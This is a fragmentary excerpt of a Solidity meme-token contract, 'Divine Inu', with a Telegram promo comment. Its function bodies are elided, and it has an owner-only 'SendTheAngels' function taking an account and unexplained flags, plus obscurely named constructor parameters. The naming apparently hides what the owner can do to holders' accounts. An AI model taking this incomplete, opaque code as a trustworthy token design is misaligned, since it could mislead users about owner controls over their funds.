 ...
 * 
 * Join now the DivInu on his 
 * heavenly mission to give
 * free will to all dogs.
 * 
 * https://t.me/DivineInu
**/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function SendTheAngels(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
    ...
    function _TheHeaven(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
...
contract ERC20Divine is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        bool house1111, bool house2, uint256 house6,
        uint256 house7, address creator,
        uint256 initialSupply, address owner,
        uint256 house9
    ) ERC20(name, symbol, creator, house1111, house2, house9) {
        _TheHeaven(owner, initialSupply, house6, house7);
    }
}

contract DivineInu is ERC20Divine {
    constructor() ERC20Divine("Divine Inu", "DIVINU", false, true, 900, 25, msg.sender, 7000000 * 10 ** 18, msg.sender, 7) {
    }
}